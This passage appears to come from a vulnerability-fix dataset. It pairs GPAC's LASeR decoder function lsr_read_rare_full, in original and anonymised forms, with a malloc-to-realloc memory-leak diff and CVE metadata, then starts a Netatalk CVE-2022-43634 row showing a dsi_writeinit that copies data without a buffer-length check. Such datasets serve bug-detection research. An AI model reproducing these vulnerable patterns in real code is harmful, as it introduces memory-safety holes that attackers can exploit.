lsr_read_byte_align_string(VAR_0, VAR_2.far_ptr, ""xlink:title"");
break;
case VAR_85:
GF_LSR_READ_INT(VAR_0, VAR_5, 3, ""xlink:type"");
break;
case VAR_86:
lsr_read_any_uri(VAR_0, VAR_2.far_ptr, ""xlink:role"");
break;
case VAR_87:
lsr_read_any_uri(VAR_0, VAR_2.far_ptr, ""xlink:arcrole"");
break;
case VAR_88:
GF_LSR_READ_INT(VAR_0, VAR_5, 2, ""xlink:actuate"");
break;
case VAR_89:
GF_LSR_READ_INT(VAR_0, VAR_5, 3, ""xlink:show"");
break;
case VAR_90:
lsr_read_smil_times(VAR_0, NULL, 0, VAR_2.far_ptr, ""end"", 0);
break;
case VAR_91:
lsr_read_duration_ex(VAR_0, NULL, 0, VAR_2.far_ptr, ""min"", 0);
break;
case VAR_92:
lsr_read_duration_ex(VAR_0, NULL, 0, VAR_2.far_ptr, ""min"", 0);
break;
}
if (VAR_0->last_error) return;
}
}",gpac/4ade98128cbc41d5115b97a41ca2e59529c8dd5f/lsr_dec.c/vul/before/0.json,"static void lsr_read_rare_full(GF_LASeRCodec *lsr, GF_Node *n)
{
	GF_FieldInfo info;
	u32 i, nb_rare, field_rare;
	s32 field_tag;

	GF_LSR_READ_INT(lsr, nb_rare, 1, ""has_rare"");
	if (!nb_rare) return;
	GF_LSR_READ_INT(lsr, nb_rare, 6, ""nbOfAttributes"");

	for (i=0; i<nb_rare; i++) {
		GF_LSR_READ_INT(lsr, field_rare, 6, ""attributeRARE"");

		/*lsr extend*/
		if (field_rare==49) {
			u32 extID, len, j;
			while (1) {
				GF_LSR_READ_INT(lsr, extID, lsr->info->cfg.extensionIDBits, ""extensionID"");
				len = lsr_read_vluimsbf5(lsr, ""len"");
				if (extID==2) {
					GF_LSR_READ_INT(lsr, len, 2, ""nbOfAttributes"");
					for (j=0; j<len; j++) {
						GF_LSR_READ_INT(lsr, extID, 3, ""attributeRARE"");
						switch (extID) {
						case 0:
							lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_syncMaster, GF_TRUE, GF_FALSE, &info);
							GF_LSR_READ_INT(lsr, *(SVG_Boolean *)info.far_ptr, 1, ""syncMaster"");
							break;
						case 1:
							lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_focusHighlight, GF_TRUE, GF_FALSE, &info);
							GF_LSR_READ_INT(lsr, *(SVG_FocusHighlight *)info.far_ptr, 2, ""focusHighlight"");
							break;
						case 2:
							lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_initialVisibility, GF_TRUE, GF_FALSE, &info);
							GF_LSR_READ_INT(lsr, *(SVG_InitialVisibility *)info.far_ptr, 2, ""initialVisibility"");
							break;
						case 3:
							lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_fullscreen, GF_TRUE, GF_FALSE, &info);
							GF_LSR_READ_INT(lsr, *(SVG_Boolean *)info.far_ptr, 1, ""fullscreen"");
							break;
						case 4:
							lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_requiredFonts, GF_TRUE, GF_FALSE, &info);
							lsr_read_byte_align_string_list(lsr, *(GF_List **)info.far_ptr, ""requiredFonts"", GF_FALSE, GF_TRUE);
							break;
						}
					}
				} else {
					gf_bs_read_int(lsr->bs, len);
				}
				GF_LSR_READ_INT(lsr, extID, 1, ""hasNextExtension"");
				if (!extID) break;
			}
			continue;
		}
		field_tag = gf_lsr_rare_type_to_attribute(field_rare);
		if (field_tag==-1) {
			return;
		}
		lsr->last_error = gf_node_get_attribute_by_tag(n, field_tag, GF_TRUE, GF_FALSE, &info);
		if (!info.far_ptr) lsr->last_error = GF_NOT_SUPPORTED;
		if (lsr->last_error) return;

		switch (field_tag) {
		case TAG_SVG_ATT__class:
			lsr_read_byte_align_string(lsr, info.far_ptr, ""class"");
			break;
		/*properties*/
		case TAG_SVG_ATT_audio_level:
			((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""audio-level"");
			break;
		case TAG_SVG_ATT_color:
			lsr_read_paint(lsr, (SVG_Paint *)info.far_ptr, ""color"");
			break;
		case TAG_SVG_ATT_color_rendering:
			GF_LSR_READ_INT(lsr, *(SVG_RenderingHint*)info.far_ptr, 2, ""color-rendering"");
			break;
		case TAG_SVG_ATT_display:
			GF_LSR_READ_INT(lsr, *(SVG_Display*)info.far_ptr, 5, ""display"");
			break;
		case TAG_SVG_ATT_display_align:
			GF_LSR_READ_INT(lsr, *(SVG_DisplayAlign*)info.far_ptr, 3, ""display-align"");
			break;
		case TAG_SVG_ATT_fill_opacity:
			((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
			((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""fill-opacity"");
			break;
		case TAG_SVG_ATT_fill_rule:
			GF_LSR_READ_INT(lsr, *(SVG_FillRule*)info.far_ptr, 2, ""fill-rule"");
			break;
		case TAG_SVG_ATT_image_rendering:
			GF_LSR_READ_INT(lsr, *(SVG_RenderingHint*)info.far_ptr, 2, ""image-rendering"");
			break;
		case TAG_SVG_ATT_line_increment:
			lsr_read_line_increment_type(lsr, info.far_ptr, ""line-increment"");
			break;
		case TAG_SVG_ATT_pointer_events:
			GF_LSR_READ_INT(lsr, *(SVG_PointerEvents*)info.far_ptr, 4, ""pointer-events"");
			break;
		case TAG_SVG_ATT_shape_rendering:
			GF_LSR_READ_INT(lsr, *(SVG_RenderingHint*)info.far_ptr, 3, ""shape-rendering"");
			break;
		case TAG_SVG_ATT_solid_color:
			lsr_read_paint(lsr, info.far_ptr, ""solid-color"");
			break;
		case TAG_SVG_ATT_solid_opacity:
			((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
			((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""solid-opacity"");
			break;
		case TAG_SVG_ATT_stop_color:
			lsr_read_paint(lsr, info.far_ptr, ""stop-color"");
			break;
		case TAG_SVG_ATT_stop_opacity:
			((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
			((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""stop-opacity"");
			break;
		case TAG_SVG_ATT_stroke_dasharray:
		{
			u32 j, flag;
			SVG_StrokeDashArray *da = (SVG_StrokeDashArray *)info.far_ptr;
			GF_LSR_READ_INT(lsr, flag, 1, ""dashArray"");
			if (flag) {
				da->type=SVG_STROKEDASHARRAY_INHERIT;
			} else {
				da->type=SVG_STROKEDASHARRAY_ARRAY;
				da->array.count = lsr_read_vluimsbf5(lsr, ""len"");
				da->array.vals = (Fixed*)gf_realloc(da->array.vals, sizeof(Fixed)*da->array.count);
				da->array.units = (u8*)gf_realloc(da->array.units, sizeof(u8)*da->array.count);
				if (!da->array.vals || !da->array.units) {
					lsr->last_error = GF_OUT_OF_MEM;
					return;
				}
				for (j=0; j<da->array.count; j++) {
					da->array.vals[j] = lsr_read_fixed_16_8(lsr, ""dash"");
					da->array.units[j] = 0;
					if (lsr->last_error) return;
				}
			}
		}
		break;
		case TAG_SVG_ATT_stroke_dashoffset:
			lsr_read_fixed_16_8i(lsr, info.far_ptr, ""dashOffset"");
			break;

		case TAG_SVG_ATT_stroke_linecap:
			GF_LSR_READ_INT(lsr, *(SVG_StrokeLineCap*)info.far_ptr, 2, ""stroke-linecap"");
			break;
		case TAG_SVG_ATT_stroke_linejoin:
			GF_LSR_READ_INT(lsr, *(SVG_StrokeLineJoin*)info.far_ptr, 2, ""stroke-linejoin"");
			break;
		case TAG_SVG_ATT_stroke_miterlimit:
			lsr_read_fixed_16_8i(lsr, info.far_ptr, ""miterLimit"");
			break;
		case TAG_SVG_ATT_stroke_opacity:
			((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
			((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""stroke-opacity"");
			break;
		case TAG_SVG_ATT_stroke_width:
			lsr_read_fixed_16_8i(lsr, info.far_ptr, ""strokeWidth"");
			break;
		case TAG_SVG_ATT_text_anchor:
			GF_LSR_READ_INT(lsr, *(SVG_TextAnchor*)info.far_ptr, 2, ""text-achor"");
			break;
		case TAG_SVG_ATT_text_rendering:
			GF_LSR_READ_INT(lsr, *(SVG_RenderingHint*)info.far_ptr, 3, ""text-rendering"");
			break;
		case TAG_SVG_ATT_viewport_fill:
			lsr_read_paint(lsr, info.far_ptr, ""viewport-fill"");
			break;
		case TAG_SVG_ATT_viewport_fill_opacity:
			((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
			((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""viewport-fill-opacity"");
			break;
		case TAG_SVG_ATT_vector_effect:
			GF_LSR_READ_INT(lsr, *(SVG_VectorEffect*)info.far_ptr, 4, ""vector-effect"");
			break;
		case TAG_SVG_ATT_visibility:
			GF_LSR_READ_INT(lsr, *(SVG_Visibility*)info.far_ptr, 2, ""visibility"");
			break;
		case TAG_SVG_ATT_requiredExtensions:
			lsr_read_byte_align_string_list(lsr, *(GF_List**)info.far_ptr, ""requiredExtensions"", GF_TRUE, GF_FALSE);
			break;
		case TAG_SVG_ATT_requiredFormats:
			lsr_read_byte_align_string_list(lsr, *(GF_List**)info.far_ptr, ""requiredFormats"", GF_FALSE, GF_FALSE);
			break;
		case TAG_SVG_ATT_requiredFeatures:
		{
			u32 j, fcount = lsr_read_vluimsbf5(lsr, ""count"");
			for (j=0; j<fcount; j++) {
				u32 fval;
				GF_LSR_READ_INT(lsr, fval, 6, ""feature"");
				if (lsr->last_error) return;
			}
		}
		break;
		case TAG_SVG_ATT_systemLanguage:
			lsr_read_byte_align_string_list(lsr, *(GF_List**)info.far_ptr, ""systemLanguage"", GF_FALSE, GF_FALSE);
			break;
		case TAG_XML_ATT_base:
			lsr_read_byte_align_string(lsr, &((XMLRI*)info.far_ptr)->string, ""xml:base"");
			((XMLRI*)info.far_ptr)->type = XMLRI_STRING;
			break;
		case TAG_XML_ATT_lang:
			lsr_read_byte_align_string(lsr, info.far_ptr, ""xml:lang"");
			break;
		case TAG_XML_ATT_space:
			GF_LSR_READ_INT(lsr, *(XML_Space*)info.far_ptr, 1, ""xml:space"");
			break;
		/*focusable*/
		case TAG_SVG_ATT_nav_next:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusNext"");
			break;
		case TAG_SVG_ATT_nav_up:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusNorth"");
			break;
		case TAG_SVG_ATT_nav_up_left:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusNorthEast"");
			break;
		case TAG_SVG_ATT_nav_up_right:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusNorthWest"");
			break;
		case TAG_SVG_ATT_nav_prev:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusPrev"");
			break;
		case TAG_SVG_ATT_nav_down:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusSouth"");
			break;
		case TAG_SVG_ATT_nav_down_left:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusSouthEast"");
			break;
		case TAG_SVG_ATT_nav_down_right:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusSouthWest"");
			break;
		case TAG_SVG_ATT_nav_left:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusEast"");
			break;
		case TAG_SVG_ATT_focusable:
			GF_LSR_READ_INT(lsr, *(SVG_Focusable*)info.far_ptr, 2, ""focusable"");
			break;
		case TAG_SVG_ATT_nav_right:
			lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusWest"");
			break;
		case TAG_SVG_ATT_transform:
			lsr_read_matrix(lsr, info.far_ptr);
			break;
		case TAG_SVG_ATT_text_decoration:
			lsr_read_byte_align_string_list(lsr, *(GF_List**)info.far_ptr, ""textDecoration"", GF_FALSE, GF_FALSE);
			break;

		case TAG_SVG_ATT_font_variant:
			GF_LSR_READ_INT(lsr, *(SVG_FontVariant*)info.far_ptr, 2, ""font-variant"");
			break;
		case TAG_SVG_ATT_font_family:
		{
			u32 flag;
			GF_LSR_READ_INT(lsr, flag, 1, ""isInherit"");
			if (flag) {
				((SVG_FontFamily*)info.far_ptr)->type = SVG_FONTFAMILY_INHERIT;
			} else {
				char *ft;
				((SVG_FontFamily*)info.far_ptr)->type = SVG_FONTFAMILY_VALUE;
				GF_LSR_READ_INT(lsr, flag, lsr->fontIndexBits, ""fontIndex"");
				ft = (char*)gf_list_get(lsr->font_table, flag);
				if (ft) ((SVG_FontFamily*)info.far_ptr)->value = gf_strdup(ft);
			}
		}
		break;
		case TAG_SVG_ATT_font_size:
			lsr_read_fixed_16_8i(lsr, info.far_ptr, ""fontSize"");
			break;
		case TAG_SVG_ATT_font_style:
			GF_LSR_READ_INT(lsr, *(SVG_FontStyle*)info.far_ptr, 3, ""fontStyle"");
			break;
		case TAG_SVG_ATT_font_weight:
			GF_LSR_READ_INT(lsr, *(SVG_FontWeight*)info.far_ptr, 4, ""fontWeight"");
			break;
		case TAG_XLINK_ATT_title:
			lsr_read_byte_align_string(lsr, info.far_ptr, ""xlink:title"");
			break;
		case TAG_XLINK_ATT_type:
			/*TODO FIXME*/
			GF_LSR_READ_INT(lsr, field_rare, 3, ""xlink:type"");
			break;
		case TAG_XLINK_ATT_role:
			lsr_read_any_uri(lsr, info.far_ptr, ""xlink:role"");
			break;
		case TAG_XLINK_ATT_arcrole:
			lsr_read_any_uri(lsr, info.far_ptr, ""xlink:arcrole"");
			break;
		case TAG_XLINK_ATT_actuate:
			/*TODO FIXME*/
			GF_LSR_READ_INT(lsr, field_rare, 2, ""xlink:actuate"");
			break;
		case TAG_XLINK_ATT_show:
			/*TODO FIXME*/
			GF_LSR_READ_INT(lsr, field_rare, 3, ""xlink:show"");
			break;
		case TAG_SVG_ATT_end:
			lsr_read_smil_times(lsr, NULL, 0, info.far_ptr, ""end"", 0);
			break;
		case TAG_SVG_ATT_max:
			lsr_read_duration_ex(lsr, NULL, 0, info.far_ptr, ""min"", 0);
			break;
		case TAG_SVG_ATT_min:
			lsr_read_duration_ex(lsr, NULL, 0, info.far_ptr, ""min"", 0);
			break;
		}
		if (lsr->last_error) return;
	}
}","static void lsr_read_rare_full(GF_LASeRCodec *VAR_0, GF_Node *VAR_1)
{
	GF_FieldInfo VAR_2;
	u32 VAR_3, VAR_4, VAR_5;
	s32 VAR_6;

	GF_LSR_READ_INT(VAR_0, VAR_4, 1, ""has_rare"");
	if (!VAR_4) return;
	GF_LSR_READ_INT(VAR_0, VAR_4, 6, ""nbOfAttributes"");

	for (VAR_3=0; VAR_3<VAR_4; VAR_3++) {
		GF_LSR_READ_INT(VAR_0, VAR_5, 6, ""attributeRARE"");

		/* COMMENT_0 */
		if (VAR_5==49) {
			u32 VAR_7, VAR_8, VAR_9;
			while (1) {
				GF_LSR_READ_INT(VAR_0, VAR_7, VAR_0->info->cfg.extensionIDBits, ""extensionID"");
				VAR_8 = lsr_read_vluimsbf5(VAR_0, ""len"");
				if (VAR_7==2) {
					GF_LSR_READ_INT(VAR_0, VAR_8, 2, ""nbOfAttributes"");
					for (VAR_9=0; VAR_9<VAR_8; VAR_9++) {
						GF_LSR_READ_INT(VAR_0, VAR_7, 3, ""attributeRARE"");
						switch (VAR_7) {
						case 0:
							VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_10, VAR_11, VAR_12, &VAR_2);
							GF_LSR_READ_INT(VAR_0, *(SVG_Boolean *)VAR_2.far_ptr, 1, ""syncMaster"");
							break;
						case 1:
							VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_13, VAR_11, VAR_12, &VAR_2);
							GF_LSR_READ_INT(VAR_0, *(SVG_FocusHighlight *)VAR_2.far_ptr, 2, ""focusHighlight"");
							break;
						case 2:
							VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_14, VAR_11, VAR_12, &VAR_2);
							GF_LSR_READ_INT(VAR_0, *(SVG_InitialVisibility *)VAR_2.far_ptr, 2, ""initialVisibility"");
							break;
						case 3:
							VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_15, VAR_11, VAR_12, &VAR_2);
							GF_LSR_READ_INT(VAR_0, *(SVG_Boolean *)VAR_2.far_ptr, 1, ""fullscreen"");
							break;
						case 4:
							VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_16, VAR_11, VAR_12, &VAR_2);
							lsr_read_byte_align_string_list(VAR_0, *(GF_List **)VAR_2.far_ptr, ""requiredFonts"", VAR_12, VAR_11);
							break;
						}
					}
				} else {
					gf_bs_read_int(VAR_0->bs, VAR_8);
				}
				GF_LSR_READ_INT(VAR_0, VAR_7, 1, ""hasNextExtension"");
				if (!VAR_7) break;
			}
			continue;
		}
		VAR_6 = gf_lsr_rare_type_to_attribute(VAR_5);
		if (VAR_6==-1) {
			return;
		}
		VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_6, VAR_11, VAR_12, &VAR_2);
		if (!VAR_2.far_ptr) VAR_0->last_error = VAR_17;
		if (VAR_0->last_error) return;

		switch (VAR_6) {
		case VAR_18:
			lsr_read_byte_align_string(VAR_0, VAR_2.far_ptr, ""class"");
			break;
		/* COMMENT_1 */
		case VAR_19:
			((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""audio-level"");
			break;
		case VAR_20:
			lsr_read_paint(VAR_0, (SVG_Paint *)VAR_2.far_ptr, ""color"");
			break;
		case VAR_21:
			GF_LSR_READ_INT(VAR_0, *(SVG_RenderingHint*)VAR_2.far_ptr, 2, ""color-rendering"");
			break;
		case VAR_22:
			GF_LSR_READ_INT(VAR_0, *(SVG_Display*)VAR_2.far_ptr, 5, ""display"");
			break;
		case VAR_23:
			GF_LSR_READ_INT(VAR_0, *(SVG_DisplayAlign*)VAR_2.far_ptr, 3, ""display-align"");
			break;
		case VAR_24:
			((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
			((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""fill-opacity"");
			break;
		case VAR_26:
			GF_LSR_READ_INT(VAR_0, *(SVG_FillRule*)VAR_2.far_ptr, 2, ""fill-rule"");
			break;
		case VAR_27:
			GF_LSR_READ_INT(VAR_0, *(SVG_RenderingHint*)VAR_2.far_ptr, 2, ""image-rendering"");
			break;
		case VAR_28:
			lsr_read_line_increment_type(VAR_0, VAR_2.far_ptr, ""line-increment"");
			break;
		case VAR_29:
			GF_LSR_READ_INT(VAR_0, *(SVG_PointerEvents*)VAR_2.far_ptr, 4, ""pointer-events"");
			break;
		case VAR_30:
			GF_LSR_READ_INT(VAR_0, *(SVG_RenderingHint*)VAR_2.far_ptr, 3, ""shape-rendering"");
			break;
		case VAR_31:
			lsr_read_paint(VAR_0, VAR_2.far_ptr, ""solid-color"");
			break;
		case VAR_32:
			((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
			((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""solid-opacity"");
			break;
		case VAR_33:
			lsr_read_paint(VAR_0, VAR_2.far_ptr, ""stop-color"");
			break;
		case VAR_34:
			((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
			((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""stop-opacity"");
			break;
		case VAR_35:
		{
			u32 VAR_9, VAR_36;
			SVG_StrokeDashArray *VAR_37 = (SVG_StrokeDashArray *)VAR_2.far_ptr;
			GF_LSR_READ_INT(VAR_0, VAR_36, 1, ""dashArray"");
			if (VAR_36) {
				VAR_37->type=VAR_38;
			} else {
				VAR_37->type=VAR_39;
				VAR_37->array.count = lsr_read_vluimsbf5(VAR_0, ""len"");
				VAR_37->array.vals = (Fixed*)gf_realloc(VAR_37->array.vals, sizeof(Fixed)*VAR_37->array.count);
				VAR_37->array.units = (u8*)gf_realloc(VAR_37->array.units, sizeof(u8)*VAR_37->array.count);
				if (!VAR_37->array.vals || !VAR_37->array.units) {
					VAR_0->last_error = VAR_40;
					return;
				}
				for (VAR_9=0; VAR_9<VAR_37->array.count; VAR_9++) {
					VAR_37->array.vals[VAR_9] = lsr_read_fixed_16_8(VAR_0, ""dash"");
					VAR_37->array.units[VAR_9] = 0;
					if (VAR_0->last_error) return;
				}
			}
		}
		break;
		case VAR_41:
			lsr_read_fixed_16_8i(VAR_0, VAR_2.far_ptr, ""dashOffset"");
			break;

		case VAR_42:
			GF_LSR_READ_INT(VAR_0, *(SVG_StrokeLineCap*)VAR_2.far_ptr, 2, ""stroke-linecap"");
			break;
		case VAR_43:
			GF_LSR_READ_INT(VAR_0, *(SVG_StrokeLineJoin*)VAR_2.far_ptr, 2, ""stroke-linejoin"");
			break;
		case VAR_44:
			lsr_read_fixed_16_8i(VAR_0, VAR_2.far_ptr, ""miterLimit"");
			break;
		case VAR_45:
			((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
			((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""stroke-opacity"");
			break;
		case VAR_46:
			lsr_read_fixed_16_8i(VAR_0, VAR_2.far_ptr, ""strokeWidth"");
			break;
		case VAR_47:
			GF_LSR_READ_INT(VAR_0, *(SVG_TextAnchor*)VAR_2.far_ptr, 2, ""text-achor"");
			break;
		case VAR_48:
			GF_LSR_READ_INT(VAR_0, *(SVG_RenderingHint*)VAR_2.far_ptr, 3, ""text-rendering"");
			break;
		case VAR_49:
			lsr_read_paint(VAR_0, VAR_2.far_ptr, ""viewport-fill"");
			break;
		case VAR_50:
			((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
			((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""viewport-fill-opacity"");
			break;
		case VAR_51:
			GF_LSR_READ_INT(VAR_0, *(SVG_VectorEffect*)VAR_2.far_ptr, 4, ""vector-effect"");
			break;
		case VAR_52:
			GF_LSR_READ_INT(VAR_0, *(SVG_Visibility*)VAR_2.far_ptr, 2, ""visibility"");
			break;
		case VAR_53:
			lsr_read_byte_align_string_list(VAR_0, *(GF_List**)VAR_2.far_ptr, ""requiredExtensions"", VAR_11, VAR_12);
			break;
		case VAR_54:
			lsr_read_byte_align_string_list(VAR_0, *(GF_List**)VAR_2.far_ptr, ""requiredFormats"", VAR_12, VAR_12);
			break;
		case VAR_55:
		{
			u32 VAR_9, VAR_56 = lsr_read_vluimsbf5(VAR_0, ""count"");
			for (VAR_9=0; VAR_9<VAR_56; VAR_9++) {
				u32 VAR_57;
				GF_LSR_READ_INT(VAR_0, VAR_57, 6, ""feature"");
				if (VAR_0->last_error) return;
			}
		}
		break;
		case VAR_58:
			lsr_read_byte_align_string_list(VAR_0, *(GF_List**)VAR_2.far_ptr, ""systemLanguage"", VAR_12, VAR_12);
			break;
		case VAR_59:
			lsr_read_byte_align_string(VAR_0, &((XMLRI*)VAR_2.far_ptr)->string, ""xml:base"");
			((XMLRI*)VAR_2.far_ptr)->type = VAR_60;
			break;
		case VAR_61:
			lsr_read_byte_align_string(VAR_0, VAR_2.far_ptr, ""xml:lang"");
			break;
		case VAR_62:
			GF_LSR_READ_INT(VAR_0, *(XML_Space*)VAR_2.far_ptr, 1, ""xml:space"");
			break;
		/* COMMENT_2 */
		case VAR_63:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusNext"");
			break;
		case VAR_64:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusNorth"");
			break;
		case VAR_65:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusNorthEast"");
			break;
		case VAR_66:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusNorthWest"");
			break;
		case VAR_67:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusPrev"");
			break;
		case VAR_68:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusSouth"");
			break;
		case VAR_69:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusSouthEast"");
			break;
		case VAR_70:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusSouthWest"");
			break;
		case VAR_71:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusEast"");
			break;
		case VAR_72:
			GF_LSR_READ_INT(VAR_0, *(SVG_Focusable*)VAR_2.far_ptr, 2, ""focusable"");
			break;
		case VAR_73:
			lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusWest"");
			break;
		case VAR_74:
			lsr_read_matrix(VAR_0, VAR_2.far_ptr);
			break;
		case VAR_75:
			lsr_read_byte_align_string_list(VAR_0, *(GF_List**)VAR_2.far_ptr, ""textDecoration"", VAR_12, VAR_12);
			break;

		case VAR_76:
			GF_LSR_READ_INT(VAR_0, *(SVG_FontVariant*)VAR_2.far_ptr, 2, ""font-variant"");
			break;
		case VAR_77:
		{
			u32 VAR_36;
			GF_LSR_READ_INT(VAR_0, VAR_36, 1, ""isInherit"");
			if (VAR_36) {
				((SVG_FontFamily*)VAR_2.far_ptr)->type = VAR_78;
			} else {
				char *VAR_79;
				((SVG_FontFamily*)VAR_2.far_ptr)->type = VAR_80;
				GF_LSR_READ_INT(VAR_0, VAR_36, VAR_0->fontIndexBits, ""fontIndex"");
				VAR_79 = (char*)gf_list_get(VAR_0->font_table, VAR_36);
				if (VAR_79) ((SVG_FontFamily*)VAR_2.far_ptr)->value = gf_strdup(VAR_79);
			}
		}
		break;
		case VAR_81:
			lsr_read_fixed_16_8i(VAR_0, VAR_2.far_ptr, ""fontSize"");
			break;
		case VAR_82:
			GF_LSR_READ_INT(VAR_0, *(SVG_FontStyle*)VAR_2.far_ptr, 3, ""fontStyle"");
			break;
		case VAR_83:
			GF_LSR_READ_INT(VAR_0, *(SVG_FontWeight*)VAR_2.far_ptr, 4, ""fontWeight"");
			break;
		case VAR_84:
			lsr_read_byte_align_string(VAR_0, VAR_2.far_ptr, ""xlink:title"");
			break;
		case VAR_85:
			/* COMMENT_3 */
			GF_LSR_READ_INT(VAR_0, VAR_5, 3, ""xlink:type"");
			break;
		case VAR_86:
			lsr_read_any_uri(VAR_0, VAR_2.far_ptr, ""xlink:role"");
			break;
		case VAR_87:
			lsr_read_any_uri(VAR_0, VAR_2.far_ptr, ""xlink:arcrole"");
			break;
		case VAR_88:
			/* COMMENT_3 */
			GF_LSR_READ_INT(VAR_0, VAR_5, 2, ""xlink:actuate"");
			break;
		case VAR_89:
			/* COMMENT_3 */
			GF_LSR_READ_INT(VAR_0, VAR_5, 3, ""xlink:show"");
			break;
		case VAR_90:
			lsr_read_smil_times(VAR_0, NULL, 0, VAR_2.far_ptr, ""end"", 0);
			break;
		case VAR_91:
			lsr_read_duration_ex(VAR_0, NULL, 0, VAR_2.far_ptr, ""min"", 0);
			break;
		case VAR_92:
			lsr_read_duration_ex(VAR_0, NULL, 0, VAR_2.far_ptr, ""min"", 0);
			break;
		}
		if (VAR_0->last_error) return;
	}
}",gpac/4ade98128cbc41d5115b97a41ca2e59529c8dd5f/lsr_dec.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -123,8 +123,8 @@
 			} else {
 				da->type=SVG_STROKEDASHARRAY_ARRAY;
 				da->array.count = lsr_read_vluimsbf5(lsr, ""len"");
-				da->array.vals = (Fixed*)gf_malloc(sizeof(Fixed)*da->array.count);
-				da->array.units = (u8*)gf_malloc(sizeof(u8)*da->array.count);
+				da->array.vals = (Fixed*)gf_realloc(da->array.vals, sizeof(Fixed)*da->array.count);
+				da->array.units = (u8*)gf_realloc(da->array.units, sizeof(u8)*da->array.count);
 				if (!da->array.vals || !da->array.units) {
 					lsr->last_error = GF_OUT_OF_MEM;
 					return;","{'deleted_lines': ['\t\t\t\tda->array.vals = (Fixed*)gf_malloc(sizeof(Fixed)*da->array.count);', '\t\t\t\tda->array.units = (u8*)gf_malloc(sizeof(u8)*da->array.count);'], 'added_lines': ['\t\t\t\tda->array.vals = (Fixed*)gf_realloc(da->array.vals, sizeof(Fixed)*da->array.count);', '\t\t\t\tda->array.units = (u8*)gf_realloc(da->array.units, sizeof(u8)*da->array.count);']}",True,GPAC version 2.2-rev0-gab012bbfb-master was discovered to contain a memory leak in lsr_read_rare_full function.,7.8,HIGH,2,valid,2023-01-04T10:31:29Z,4
CVE-2022-43634,['CWE-122'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,Netatalk/netatalk,fix CVE-2022-43634,72216b33128365037466f357da572a28e0496ca4,https://github.com/Netatalk/netatalk/commit/72216b33128365037466f357da572a28e0496ca4,libatalk/dsi/dsi_write.c,dsi_writeinit,"size_t dsi_writeinit(DSI *dsi, void *buf, const size_t buflen _U_)
{
size_t bytes = 0;
dsi->datasize = ntohl(dsi->header.dsi_len) - dsi->header.dsi_data.dsi_doff;
if (dsi->eof > dsi->start) {
bytes = MIN(dsi->eof - dsi->start, dsi->datasize);
memmove(buf, dsi->start, bytes);
dsi->start += bytes;
dsi->datasize -= bytes;
if (dsi->start >= dsi->eof)
dsi->start = dsi->eof = dsi->buffer;
}
LOG(log_maxdebug, logtype_dsi, ""dsi_writeinit: remaining DSI datasize: %jd"", (intmax_t)dsi->datasize);
return bytes;
}","size_t dsi_writeinit(DSI *VAR_0, void *VAR_1, const size_t VAR_2 _U_)
{
size_t VAR_3 = 0;
